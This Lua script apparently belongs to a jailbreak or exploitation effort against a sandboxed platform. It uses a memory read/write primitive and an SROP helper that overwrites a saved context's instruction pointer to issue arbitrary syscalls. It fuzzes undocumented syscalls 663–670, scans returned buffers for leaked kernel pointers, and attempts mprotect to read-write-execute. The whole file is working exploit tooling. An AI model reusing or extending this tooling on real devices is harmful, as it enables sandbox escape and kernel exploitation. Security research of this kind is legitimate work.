-- CRASH_CLASS: MODERATE
-- PROBE 143d: Deep investigation of sys 670 (returns 0 with zero args!)
-- Isolation sweep found 670 is the only 661-670 syscall returning SUCCESS.
-- Test: output buffers, argument sensitivity, state changes, kernel leaks.

print("=== PROBE 143d: SYS 670 DEEP ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc20 = make_syscall(20)

local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local brh, brl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", brh, brl - 2))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)

--------------------------------------------------------------------
-- [A] Basic call with output buffer — does 670 write anything?
--------------------------------------------------------------------
print("--- [A] sys 670 with output buffer ---")

local outbuf = gpu + 0x1000
for off = 0, 0xFF, 4 do wd(outbuf + off, 0xAAAAAAAA) end

local rv = srop(670, ua(outbuf), uint64(256))
local rh, rl = get_hi_lo(rv)
print("[A] ret=" .. rl .. " hi=" .. rh)

local changed = false
for off = 0, 0xFC, 4 do
    local v = safe_rd(outbuf + off) or 0
    if v ~= 0xAAAAAAAA then
        changed = true
        print("[A] +" .. string.format("%02X", off) .. " = 0x" .. string.format("%08X", v))
    end
end
if not changed then print("[A] buffer unchanged") end

-- Check for kernel pointers in output
for off = 0, 0xF8, 8 do
    local q = safe_rq(outbuf + off)
    if q then
        local qh, ql = get_hi_lo(q)
        if qh >= 0xFFFF8000 and qh ~= 0xFFFFFFFF then
            print("[A] *** KERNEL PTR +" .. string.format("%02X", off) .. "=" .. hex(q) .. " ***")
        end
    end
end

--------------------------------------------------------------------
-- [B] Argument sensitivity — which arg patterns change the return?
--------------------------------------------------------------------
print("")
print("--- [B] arg sensitivity ---")

local arg_tests = {
    {0, 0, 0, 0, 0, 0, "all-zero"},
    {1, 0, 0, 0, 0, 0, "a1=1"},
    {0, 1, 0, 0, 0, 0, "a2=1"},
    {0, 0, 1, 0, 0, 0, "a3=1"},
    {0, 0, 0, 1, 0, 0, "a4=1"},
    {0, 0, 0, 0, 1, 0, "a5=1"},
    {0, 0, 0, 0, 0, 1, "a6=1"},
}

for _, t in ipairs(arg_tests) do
    local r = srop(670, uint64(t[1]), uint64(t[2]), uint64(t[3]),
                   uint64(t[4]), uint64(t[5]), uint64(t[6]))
    local rh2, rl2 = get_hi_lo(r)
    print("[B] " .. t[7] .. " ret=" .. rl2 .. " hi=" .. rh2)
end

-- Try with buffer pointer as arg1
for off = 0, 0xFF, 4 do wd(outbuf + off, 0) end
rv = srop(670, ua(outbuf), uint64(0x100), uint64(0))
rh, rl = get_hi_lo(rv)
print("[B] ptr+size ret=" .. rl)
changed = false
for off = 0, 0xFC, 4 do
    local v = safe_rd(outbuf + off) or 0
    if v ~= 0 then
        changed = true
        print("[B] +" .. string.format("%02X", off) .. " = 0x" .. string.format("%08X", v))
    end
end
if not changed then print("[B] buffer still zero") end

--------------------------------------------------------------------
-- [C] Try 670 as (cmd, arg) pattern
--------------------------------------------------------------------
print("")
print("--- [C] cmd/arg pattern ---")

for cmd = 0, 15 do
    for off2 = 0, 0xFF, 4 do wd(outbuf + off2, 0xBBBBBBBB) end
    local r = srop(670, uint64(cmd), ua(outbuf), uint64(256))
    local rh2, rl2 = get_hi_lo(r)
    if rl2 ~= rl then
        print("[C] cmd=" .. cmd .. " ret=" .. rl2)
    end
    -- Check if buffer changed
    local v0 = safe_rd(outbuf) or 0
    if v0 ~= 0xBBBBBBBB then
        print("[C] cmd=" .. cmd .. " buf changed! [0]=0x" .. string.format("%08X", v0))
        for boff = 0, 0x3C, 4 do
            local bv = safe_rd(outbuf + boff) or 0
            if bv ~= 0xBBBBBBBB then
                print("[C]   +" .. string.format("%02X", boff) .. "=0x" .. string.format("%08X", bv))
            end
        end
    end
end

--------------------------------------------------------------------
-- [D] State check: does 670 affect mprotect/mmap permissions?
-- Call 670, then try mprotect(RWX) to see if it unlocked anything
--------------------------------------------------------------------
print("")
print("--- [D] post-670 state ---")

srop(670, uint64(0), uint64(0), uint64(0))

-- Try mprotect(RWX) on GPU buffer
local rv_mp = srop(74, ua(gpu), uint64(0x4000), uint64(7))
local mph, mpl = get_hi_lo(rv_mp)
print("[D] mprotect(RWX) after 670: ret=" .. mpl)

-- Check sys 624 counter (VM ops counter)
local rv_624 = srop(624, uint64(0), uint64(0), uint64(0))
local c6h, c6l = get_hi_lo(rv_624)
print("[D] sys 624 counter=" .. c6l)

-- Get new pid to see if anything changed
local pid2 = to_num(sc20())
print("[D] pid after=" .. pid2)

--------------------------------------------------------------------
-- [E] Try 670 with large arg values (flags/bitmasks)
--------------------------------------------------------------------
print("")
print("--- [E] large arg values ---")

local large_tests = {
    {0x100, "0x100"},
    {0x1000, "0x1000"},
    {0x10000, "0x10000"},
}

for _, t in ipairs(large_tests) do
    local r = srop(670, uint64(t[1]), uint64(0), uint64(0))
    local rh2, rl2 = get_hi_lo(r)
    if rl2 ~= 0 then
        print("[E] a1=" .. t[2] .. " ret=" .. rl2)
    end
end

-- Try with arg2 as different values
for val = 1, 8 do
    local r = srop(670, uint64(0), uint64(val), uint64(0))
    local rh2, rl2 = get_hi_lo(r)
    if rl2 ~= 0 then
        print("[E] a2=" .. val .. " ret=" .. rl2)
    end
end

--------------------------------------------------------------------
-- [F] Probe live handlers 663, 664, 666, 667, 669
-- These return -1 with zero args — try common arg patterns
--------------------------------------------------------------------
print("")
print("--- [F] live handler arg scan ---")

local live_syss = {663, 664, 666, 667, 669}
local patterns = {
    {0, 0, "zero"},
    {1, 0, "a1=1"},
    {0, 1, "a2=1"},
}

for _, sn in ipairs(live_syss) do
    for off2 = 0, 0xFF, 4 do wd(outbuf + off2, 0) end

    -- Try: (outbuf, size, 0)
    rv = srop(sn, ua(outbuf), uint64(0x100), uint64(0))
    rh, rl = get_hi_lo(rv)
    local buf0 = safe_rd(outbuf) or 0
    if rl == 0 or buf0 ~= 0 then
        print("[F] sys " .. sn .. " (ptr,size) ret=" .. rl .. " buf[0]=0x" .. string.format("%08X", buf0))
        for boff = 0, 0x3C, 4 do
            local bv = safe_rd(outbuf + boff) or 0
            if bv ~= 0 then
                print("[F]   +" .. string.format("%02X", boff) .. "=0x" .. string.format("%08X", bv))
            end
        end
        -- Kernel pointer check
        for boff = 0, 0xF8, 8 do
            local q = safe_rq(outbuf + boff)
            if q then
                local qh, ql = get_hi_lo(q)
                if qh >= 0xFFFF8000 and qh ~= 0xFFFFFFFF then
                    print("[F] *** SYS " .. sn .. " KPTR +" .. string.format("%02X", boff) .. "=" .. hex(q) .. " ***")
                end
            end
        end
    end

    -- Try: (cmd, outbuf, size) for cmd 0-3
    for cmd = 0, 3 do
        for off2 = 0, 0xFF, 4 do wd(outbuf + off2, 0) end
        rv = srop(sn, uint64(cmd), ua(outbuf), uint64(0x100))
        rh, rl = get_hi_lo(rv)
        buf0 = safe_rd(outbuf) or 0
        if rl == 0 then
            print("[F] sys " .. sn .. " cmd=" .. cmd .. " ret=0!")
            for boff = 0, 0x3C, 4 do
                local bv = safe_rd(outbuf + boff) or 0
                if bv ~= 0 then
                    print("[F]   +" .. string.format("%02X", boff) .. "=0x" .. string.format("%08X", bv))
                end
            end
        end
    end
end

print("")
print("=== DONE ===")
